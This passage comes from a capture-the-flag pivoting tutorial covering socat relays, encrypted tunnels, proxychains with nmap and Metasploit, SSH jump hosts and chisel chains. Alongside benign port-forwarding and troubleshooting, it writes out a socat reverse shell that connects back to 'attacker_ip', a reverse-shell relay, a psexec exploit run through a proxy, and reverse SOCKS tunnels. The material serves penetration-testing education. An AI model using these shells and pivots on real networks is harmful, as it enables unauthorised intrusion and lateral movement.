[Inference]: The fingerprint verification step helps prevent MITM attacks but requires initial trust.

#### Socat

Socat (SOcket CAT) is a multipurpose relay tool that can create virtually any type of connection.

##### Basic Port Forwarding

```bash
## Forward local port 8080 to remote host
socat TCP-LISTEN:8080,fork TCP:192.168.1.100:80

## Parameters explained:
## TCP-LISTEN:8080 - Listen on TCP port 8080
## fork - Create new process for each connection
## TCP:192.168.1.100:80 - Forward to this destination
```

**Bind to specific interface:**
```bash
socat TCP-LISTEN:8080,bind=0.0.0.0,fork TCP:192.168.1.100:80
```

##### Reverse Shell Relay

```bash
## On pivot host - relay reverse shell from internal host to attacker
socat TCP-LISTEN:4444,fork TCP:attacker_ip:4444

## Internal host connects to pivot:4444
## Traffic relayed to attacker:4444
```

##### UDP Forwarding

```bash
## Forward UDP port
socat UDP-LISTEN:53,fork UDP:192.168.1.100:53
```

##### Port-to-Port Forwarding on Same Host

```bash
## Redirect port 80 to 8080 locally
socat TCP-LISTEN:80,fork,reuseaddr TCP:127.0.0.1:8080
```

##### Encrypted Tunnels

**Generate certificates:**
```bash
## Create CA
openssl genrsa -out ca-key.pem 2048
openssl req -new -x509 -days 365 -key ca-key.pem -out ca-cert.pem

## Create server cert
openssl genrsa -out server-key.pem 2048
openssl req -new -key server-key.pem -out server-req.pem
openssl x509 -req -in server-req.pem -CA ca-cert.pem -CAkey ca-key.pem -CAcreateserial -out server-cert.pem -days 365

## Create client cert (similar process)
openssl genrsa -out client-key.pem 2048
openssl req -new -key client-key.pem -out client-req.pem
openssl x509 -req -in client-req.pem -CA ca-cert.pem -CAkey ca-key.pem -CAcreateserial -out client-cert.pem -days 365
```

**SSL listener:**
```bash
socat OPENSSL-LISTEN:443,cert=server-cert.pem,key=server-key.pem,verify=0,fork TCP:192.168.1.100:80
```

**SSL client:**
```bash
socat TCP-LISTEN:8080,fork OPENSSL:pivot_host:443,verify=0
```

##### File Transfers Through Socat

```bash
## Receiver (on pivot)
socat TCP-LISTEN:4444,fork OPEN:received_file,creat,trunc

## Sender (from attacker)
socat FILE:file_to_send TCP:pivot_ip:4444
```

##### TTY Shell Upgrade via Socat

```bash
## On attacker machine - listener
socat file:`tty`,raw,echo=0 tcp-listen:4444

## On target - connect back
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:attacker_ip:4444
```

##### Socat for Windows

```cmd
## Download from https://sourceforge.net/projects/unix-utils/files/socat/

## Basic port forward on Windows
socat.exe TCP-LISTEN:8080,fork TCP:192.168.1.100:80
```

#### Proxychains

Proxychains forces TCP connections through SOCKS4/SOCKS5/HTTP proxies. Essential for routing tools through SSH dynamic tunnels or other SOCKS proxies.

##### Configuration

**Edit `/etc/proxychains4.conf` or create `~/.proxychains/proxychains.conf`:**

```bash
## Dynamic chain - each proxy tried in order, dead proxies skipped
dynamic_chain

## Strict chain - all proxies must be online (default)
## strict_chain

## Random chain - random proxy from list
## random_chain

## Proxy DNS requests
proxy_dns

## Timeout in seconds
tcp_read_time_out 15000
tcp_connect_time_out 8000

[ProxyList]
## Add proxies here
socks5 127.0.0.1 1080
## socks4 127.0.0.1 1081
## http 127.0.0.1 8080
```

##### Basic Usage

```bash
## Run any command through proxy
proxychains nmap -sT -Pn 192.168.1.0/24
proxychains curl http://192.168.1.100
proxychains firefox
proxychains msfconsole

## Quiet mode (less output)
proxychains -q nmap -sT -Pn 192.168.1.100
```

##### Proxychains with Nmap

**Important limitations:**
- Only TCP connect scans work (`-sT`)
- SYN scans (`-sS`) do not work through proxychains
- Always use `-Pn` to skip ping
- UDP scans do not work

```bash
## Correct usage
proxychains nmap -sT -Pn -p 22,80,443 192.168.1.100

## Full port scan (slow through proxy)
proxychains nmap -sT -Pn -p- 192.168.1.100

## Service version detection
proxychains nmap -sT -Pn -sV -p 22,80,443 192.168.1.100
```

##### Proxychains with Metasploit

```bash
proxychains msfconsole

## Inside msfconsole
use exploit/windows/smb/psexec
set RHOSTS 192.168.1.100
set LHOST attacker_ip
run
```

##### Multiple Proxy Chains

```bash
## Stack multiple proxies
[ProxyList]
socks5 127.0.0.1 1080
socks5 127.0.0.1 1081
socks5 127.0.0.1 1082
```

##### Proxychains Alternatives

**proxychains-ng** (newer fork with better maintenance):
```bash
apt install proxychains-ng
proxychains4 command
```

#### Advanced Tunneling Scenarios

##### Double Pivot (Pivot Through Multiple Hosts)

**Scenario:** Attacker → Pivot1 → Pivot2 → Target

**Method 1: SSH Jump Hosts**
```bash
## Single command through two pivots
ssh -J user@pivot1,user@pivot2 -D 1080 user@target_network_host
```

**Method 2: Nested SSH Tunnels**
```bash
## First tunnel to Pivot1
ssh -D 1080 user@pivot1

## From another terminal, through first proxy to Pivot2
proxychains ssh -D 1081 user@pivot2

## Now use 1081 for accessing target network
proxychains -f proxychains_1081.conf nmap -sT -Pn target
```

**Method 3: Chisel Chain**
```bash
## On attacker
chisel server --port 8000 --reverse

## On Pivot1
chisel client attacker_ip:8000 R:9001:socks

## On Pivot2 (through proxychains using Pivot1's SOCKS)
proxychains chisel server --port 9002 --reverse

## Access through Pivot2
proxychains -f pivot2_proxychains.conf tools target
```

##### Local Port Forwarding Through SOCKS

Combine dynamic and local forwarding:

```bash
## Create SOCKS proxy
ssh -D 1080 user@pivot

## From another terminal, forward specific port through SOCKS
proxychains ssh -L 3389:192.168.1.50:3389 user@pivot
```

##### Reverse Tunnels for Callback Access

Useful when pivot cannot reach you directly (NAT/firewall):

```bash
## On attacker - create reverse tunnel listener
ssh -R 4444:127.0.0.1:4444 user@public_server

## On public_server, setup port forward back to attacker
## Any connection to public_server:4444 reaches attacker:4444

## From pivot, connect to public_server
nc public_server 4444
```

##### HTTP Tunneling with Socat

Bypass restrictions by tunneling over HTTP:

```bash
## Server side (attacker)
socat TCP-LISTEN:8080,fork,reuseaddr PROXY:proxy_server:target_host:target_port,proxyport=3128

## If HTTP CONNECT method allowed through corporate proxy
```

##### DNS Tunneling (Brief Overview)

[Unverified]: DNS tunneling effectiveness depends heavily on network monitoring and DNS query restrictions.

Tools like `iodine` or `dnscat2` can tunnel traffic through DNS queries when other protocols are blocked. This is beyond basic pivoting but relevant for highly restricted environments.

#### Troubleshooting Common Issues

##### SSH Tunnel Drops

```bash
## Add keepalive options
ssh -o ServerAliveInterval=60 -o ServerAliveCountMax=3 -D 1080 user@pivot

## Or add to ~/.ssh/config
Host *
    ServerAliveInterval 60
    ServerAliveCountMax 3
    TCPKeepAlive yes
```

##### Chisel Connection Failures

```bash
## Check firewall rules on server
iptables -L -n | grep 8000

## Verify server is listening
netstat -tlnp | grep chisel
ss -tlnp | grep chisel

## Test connectivity
nc -zv attacker_ip 8000
```

##### Proxychains DNS Leaks

Ensure `proxy_dns` is enabled in configuration:
```bash
## In proxychains.conf
proxy_dns
```

##### Performance Issues

```bash
## Reduce timeout values in proxychains.conf
tcp_read_time_out 5000
tcp_connect_time_out 3000

## Use compression with SSH
ssh -C -D 1080 user@pivot

## Limit Nmap timing through proxy
proxychains nmap -T2 -sT -Pn target
```

#### Tool Selection Matrix

| Scenario | Recommended Tool | Reason |
|----------|-----------------|---------|
| SSH available | SSH | Native encryption, widely available |
| SSH blocked, HTTP allowed | Chisel | Tunnels over HTTP/HTTPS |
| Simple port forward | Socat | Lightweight, flexible |
| Need to route multiple tools | SSH + Proxychains | Dynamic SOCKS proxy |
| Windows pivot host | Chisel | Cross-platform, single binary |
| Multiple protocol relay | Socat | Supports TCP/UDP/Unix sockets |
| Restricted outbound | Reverse tunnels (SSH/Chisel) | Initiates from pivot to attacker |

#### Related Important Topics

For comprehensive CTF network exploitation, consider exploring:
- **Port Knocking and Firewall Bypass**: Techniques for accessing services behind packet filters
- **IPv6 Tunneling**: Exploiting IPv6 for bypassing IPv4 security controls
- **VPN Pivoting**: Using compromised VPN clients/servers for network access
- **Container Escape and Pivoting**: Moving from containerized environments to host networks